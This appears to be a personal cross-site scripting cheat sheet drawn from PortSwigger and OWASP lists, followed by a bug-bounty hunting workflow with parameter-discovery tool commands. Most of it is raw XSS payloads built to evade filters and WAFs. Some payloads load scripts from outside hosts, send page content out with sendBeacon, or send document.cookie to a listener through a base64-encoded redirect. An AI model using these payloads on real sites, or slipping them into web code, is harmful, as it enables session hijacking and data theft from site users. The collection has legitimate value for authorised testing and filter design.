# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# XSS Locator (Polygot)
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

The following is a “polygot test XSS payload.” This test will execute in multiple contexts including html, script string, js and url.
```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(Strat0m)//'>
```

# URL add-on
```
&redirect="><img/src/onerror%3dalert('xss')>
&redirect="><img/src/onerror%3dalert(document.cookie)>
&redirect="><img/src/onerror%3dalert(document.domain)>
&redirect="><img/src/onerror%3dalert(document.lastmodified)>
```

# WAF Bypass
```
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
<svg onx=() onload=(confirm)(1)>
onfocus=alert(1) autofocus>
<svg onload=alert%26%230000000040"1")>
onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
<svg/OnLoad="`${prompt``}`">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<body onafterprint=alert(1)>
<xss onafterscriptexecute=alert(1)><script>1</script>
<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="alert(1)"></xss>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
<body onbeforeprint=alert(1)>
<xss onbeforescriptexecute=alert(1)><script>1</script>
<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
```

## Things to try:
```
onload ==> block
onerror ==> block
ONerror ==> block
ON%65rror ==> block
ON%2565rror ==> block
&#79;nerror ==> allow
onauxclick ==> allow
```
```
blocked:		try:
========		====
alert()			aler%0at%0a(1) 
```

## Other xss-filter-evasion
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

83,116,114,97,116,48,77 = Strat0m in decimal
```
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14; javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//\<</SCRIPT>
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<SCRIPT SRC=//xss.rocks/.j>
<IMG SRC="`('XSS')"`
<iframe src=http://xss.rocks/scriptlet.html <
\";alert('XSS');//
</script><script>alert('XSS');</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<svg/onload=alert('XSS')>
Set.constructor`alert\x28document.domain\x29
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> <STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT a=> SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```
## URL String Evasion
```
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
<A HREF="//www.google.com/">XSS</A>
<A HREF="//google">XSS</A>
<A HREF="http://ha.ckers.org@google">XSS</A>
<A HREF="http://google:ha.ckers.org">XSS</A>
<A HREF="http://google.com/">XSS</A>
<A HREF="http://www.google.com./">XSS</A>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<A HREF="http://www.google.com/ogle.com/">XSS</A>
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```


# Ways can you alert(document.domain)
```
// Direct invocation
alert(document.domain);
(alert)(document.domain);
al\u0065rt(document.domain);
al\u{65}rt(document.domain);
window['alert'](document.domain);
top['alert'](document.domain);
top[8680439..toString(30)](document.domain);
top[/alert/.source](document.domain);
alert(this['document']['domain']);

// Indirect Invocation
alert.call(null, document.domain);
alert.apply(null, [document.domain]);
alert.bind()(document.domain);
Reflect.apply(alert, null, [document.domain]);
alert.valueOf()(document.domain);
with(document) alert(domain);
Promise.all([document.domain]).then(alert);
document.domain.replace(/.*/, alert);

// Array methods
[document.domain].find(alert);
[document.domain].findIndex(alert);
[document.domain].filter(alert);
[document.domain].every(alert);
[document.domain].forEach(alert);

// Alternate array syntax (all array methods apply)
Array(document.domain).find(alert);
Array.of(document.domain).find(alert);
(new Array(document.domain)).find(alert);

// Other Datastructure Methods
(new Map()).set(1, document.domain).forEach(alert);
(new Set([document.domain])).forEach(alert);

// Evaluated
eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs='));
eval(atob(/YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs=/.source));
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59));
setTimeout`alert\u0028document.domain\u0029`;
Set.constructor`alert\x28document.domain\x29```;
(new Function('alert(document.domain)'))();
(new (Object.getPrototypeOf(async function(){}).constructor)('alert(document.domain)'))();
Function('x','alert(x)')(document.domain);

// Template Literal Expression
`${alert(document.domain)}`;

// onerror assignment
onerror=alert;throw document.domain;
onerror=eval;throw'=alert\x28document.domain\x29';

// With location.hash = #alert(document.domain)
eval(location.hash.substr(1))
```












## PHP
Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
```
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```



## SSI (Server Side Includes)
This requires SSI to be installed on the server to use this XSS vector. I probably don’t need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
```
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

## Using ActionScript Inside Flash for Obfuscation
```
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")"; 
eval(a+b+c+d);
```

## XML Data Island with CDATA Obfuscation
This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:
```
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

## Locally hosted XML with embedded JavaScript that is generated using an XML data island
This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:
```
<XML SRC="xsstest.xml" ID=I></XML>  
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

## HTML+TIME in XML
This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:
```
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```


## Downlevel-Hidden Block
Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn’t do the job:
```
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

## MG STYLE with Expression
This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:
```
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```


# Character Escape Sequences
All the possible combinations of the character “<” in HTML and JavaScript. Most of these won’t render out of the box, but many of them can get rendered in certain circumstances as seen above.
```
    <
    %3C
    &lt
    &lt;
    &LT
    &LT;
    &#60
    &#060
    &#0060
    &#00060
    &#000060
    &#0000060
    &#60;
    &#060;
    &#0060;
    &#00060;
    &#000060;
    &#0000060;
    &#x3c
    &#x03c
    &#x003c
    &#x0003c
    &#x00003c
    &#x000003c
    &#x3c;
    &#x03c;
    &#x003c;
    &#x0003c;
    &#x00003c;
    &#x000003c;
    &#X3c
    &#X03c
    &#X003c
    &#X0003c
    &#X00003c
    &#X000003c
    &#X3c;
    &#X03c;
    &#X003c;
    &#X0003c;
    &#X00003c;
    &#X000003c;
    &#x3C
    &#x03C
    &#x003C
    &#x0003C
    &#x00003C
    &#x000003C
    &#x3C;
    &#x03C;
    &#x003C;
    &#x0003C;
    &#x00003C;
    &#x000003C;
    &#X3C
    &#X03C
    &#X003C
    &#X0003C
    &#X00003C
    &#X000003C
    &#X3C;
    &#X03C;
    &#X003C;
    &#X0003C;
    &#X00003C;
    &#X000003C;
    \x3c
    \x3C
    \u003c
    \u003C

```


# WAF ByPass Strings for XSS.
```
    <Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
    <Video> <source onerror = "javascript: alert (XSS)">
    <Input value = "XSS" type = text>
    <applet code="javascript:confirm(document.cookie);">
    <isindex x="javascript:" onmouseover="alert(XSS)">
    "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
    "><img src="x:x" onerror="alert(XSS)">
    "><iframe src="javascript:alert(XSS)">
    <object data="javascript:alert(XSS)">
    <isindex type=image src=1 onerror=alert(XSS)>
    <img src=x:alert(alt) onerror=eval(src) alt=0>
    <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
    <iframe/src="data:text/html,<svg onload=alert(1)>">
    <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
    <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
    <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
    <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
    <form><a href="javascript:\u0061lert(1)">X
    </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
    <style>//*{x:expression(alert(/xss/))}//<style></style>
    On Mouse Over​
    <img src="/" =_=" title="onerror='prompt(1)'">
    <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
    <script x> alert(1) </script 1=2
    <form><button formaction=javascript&colon;alert(1)>CLICKME
    <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
    <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
    <OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
```


# Filter Bypass Alert Obfuscation
```
    (alert)(1)
    a=alert,a(1)
    [1].find(alert)
    top[“al”+”ert”](1)
    top[/al/.source+/ert/.source](1)
    al\u0065rt(1)
    top[‘al\145rt’](1)
    top[‘al\x65rt’](1)
    top[8680439..toString(30)](1)
    alert?.()

```


# Script injection can be carried out in the following ways:
1. Form Inputs - especially if that will be added to the site somehow (ie. name or heading of something, etc)
2. URL Query Strings
3. HTTP Headers

## Arjun
Install:
```
git clone https://github.com/s0md3v/Arjun
```
Usage: 

this will Fuzz the id parameter for other options. 
```
python arjun.py -u www.domain.com?id=FUZZ
```

## ParamSpider
Install:
```
git clone https://github.com/devanshbatham/ParamSpider
```
Usage:
```
python paramspider.py –domain www.target.com
```

## Param Miner
Look into this add on for burp suite

https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943


## WaybackURLs:
Install:
```
go get github.com/tomnomnom/waybackurls
```
Usage:
```
waybackurls tesla.com
```

## OpenRedireX: 
Asynchronous Open redirect Fuzzer for Humans

Install:
```
git clone https://github.com/devanshbatham/OpenRedireX.git
```
Usage: 
```
python3 openredirex.py -u "https://vulnerable.com/?url=FUZZ" -p payloads.txt --keyword FUZZ
```

## Aron
look into

https://github.com/m4ll0k/Aron


## Finding XSS:
1. We try to find parameter (either GET based or POST based)
2. Filter those params, whose params value reflects on page.
3. Then we test simple xss payload i.e. <script>alert(1)</script>
4. If the parameter’s value is reflecting but you are unable to execute simple xss payload due to WAF(Web Application Firewall)
5. bypass WAF
 - Such as if alert() function is a blocked keyword what if we try to execute this payload:
  ```
  <script>confirm(1)</script>
  ```
 - But what if confirm () function is also blocked by WAF,
  Then we can try to execute this payload:
  ```
  <script>prompt(1)</script>
  ```
  Sometimes replacing <script> with <ScRiPt> or by <SCRIPt> or by any other upper lower case script tag

**Remember More Parameter == High Chance of Getting Valid XSS**

how we can find hidden parameters ?

Answer: GOOGLE IT!

HINT: waybackurls

## URL XSS:
```
https://website.com/"></>{}()vict0ni
```

404 response page: look at the source code to see if the URL was reflected. looking for something like this:
```
<input type="hidden" name="DismissCookieNotice" value="true" />
<input type="hidden" name="redirected" value="https://www.website.com/"></>{}()vict0ni" />
<input type="hidden" name="csrf" value=[something] />
```
Since it was reflected, try:
```
https://website.com/"/><svg onload=alert(document.cookie)>
```
Can happen because the private session I didn’t click the “Accept Cookies” option on the pop-up that now every website is forced to provide. But I did it while browsing the website after finding the XSS. To be honest, I could have probably noticed that earlier in the DismissCookieNotice name in the source code.

To recall:
```
<input type="hidden" name="DismissCookieNotice" value="true" />
```

The vulnerability was inside the code for the pop-up (after accepting the cookies, the page refreshed and the pop-up source code was missing from the new page). So the XSS could be reproduced only by ignoring the Cookie pop-up (not dismissing it, just by ignoring it).
The logic behind this pop-up was that after accepting the cookies, the website would redirect the user to the URL he already was. That’s why the URL was reflected in the “redirected” hidden input. But they forgot to filter the user input.

Next time you test for a reflected XSS, make sure to test it before you accept the cookies. You never know!



## Bonus Tips:
1. DOM XSS is very rare and hence difficult to find/hunt
2. Reflected XSS are easy to find (Go and Hunt)
3. Stored XSS pays a good amount, but little difficult to hunt
4. If you are somehow able to find Self XSS (No Bounty for Self XSS), then try to chain it with CSRF or Insecure CORS
5. (GOLD) Did you know that hardly 30 % people try to find Blind XSS ?
6. (SILVER) Unrestricted File Upload Vulnerability Could also lead to XSS (Search it)



## Alternate XSS Syntax
### XSS Using Script in Attributes
XSS attacks may be conducted without using <script>...</script> tags. Other tags will do exactly the same thing, for example: <body onload=alert('test1')> or other attributes like: onmouseover, onerror.

#### onmouseover
```
<b onmouseover=alert('Wufff!')>click me!</b>
```
#### onerror
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>

### XSS Using Script Via Encoded URI Schemes
If we need to hide against web application filters we may try to encode string characters, e.g.: a=&\#X41 (UTF-8) and use it in IMG tags:
```
<IMG SRC=j&#X41vascript:alert('test2')>
```
There are many different UTF-8 encoding notations what give us even more possibilities.

### XSS Using Code Encoding
We may encode our script in base64 and place it in META tag. This way we get rid of alert() totally. More information about this method can be found in RFC 2397
```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
```




## XSS code:
```
"<script>alert(document.cookie)</script>
<video src=">" onerror=setTimeout`confirm\x281\x29`>
-->'"></sCript><video src=">" onerror=setTimeout`confirm\x281\x29`>
“;!—“”<script>alert(document.cookie);</script>=&{(alert(document.cokie))}
“;!—“”<script>alert(document.cookie);</script>=&{(alert(document.cookie))}
*"<sc><svg/onload=alert(strat0m)>"*
<svg onx=() onload=(confirm)(1)>
<svg onx=() onload=(confirm)(document.cookie)>
<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
<svg/OnLoad=aLerT(1)>
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;''>click
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
<a69/onclick=[1].findIndex(alert)>pew
&#x3C;svg onx=() onload=(confirm)(1)&#x3E;
<svg onload=alert("Strat0m")>
<svg onload=prompt("Strat0m")>
<script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click(); </script>
( <script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click(); </script> )
abcd<script>alert("Strat0m")</script>
<svg onload=alert("OpenRemoteJSON")><!--
<svg onload=alert("OpenRemoteCSV")><!--
"><ScRiPt>alert(document.cookie)</ScRiPt>
"><h1>STORED XSS</h1>
"><svg/onload=alert(1)>
"><svg/onmouseover=alert(1)>
"<script>alert(document.cookie)</script>"
"<script>alert(document.domain)</script>"
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
"*"><script>alert(document.cookie)</script>*"
"><img src onerror=alert(1)>
"><sCrIpT>alert(1)</sCrIpT>
"<script>alert("strat0m")</script>"
<a href="javascript&#58alert(document.domain)">Example Attack</a>
<a href="javascript%u003Aalert(/XSS/)">poc</a>
"<IMG """><SCRIPT>alert("XSS")</SCRIPT>">"
'"><script>alert("subject")</script>'
"<script>alert("pwnshell")</script>"
"><img src onerror=alert(1)> in "Branch Name" , "School Name" , "Mobile No." , "Currency" , "Symbol" , "City" and "State".
<d3v/onauxclick=[2].some(confirm)>click
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'> 
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
<svg onload=alert%26%230000000040"1")>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
<script>confirm(1)</script>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
"strat0m"><img src=x onerror=confirm(1)>"
strat0m"><img src=x onerror=confirm(1)>
&#0000060
&#000060
&#00060
&#0060
&#00;</form><input type&#61;"date" onfocus="alert(1)">
&#060
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
¼script¾alert(¢XSS¢)¼/script¾
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
%253cscript%253ealert(1)%253c/script%253e
%253cscript%253ealert(document.cookie)%253c/script%253e
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
%3C
&#60
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
a=\"get\";
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
‘)alert(1);//
‘; alert(1);
‘; alert(document.cookie); var foo=’
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
\";alert('XSS');//
\\";alert('XSS');//
<audio src=1 onerror=alert(1)>
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
<BODY ONLOAD=alert('hellox worldss')>
<BODY ONLOAD=alert(‘XSS’)>
<BODY ONLOAD=alert(’XSS’)>
<body/onload=&lt;!--&gt;&#10alert(1)>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
<div/onmouseover='alert(1)'> style="x:">
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
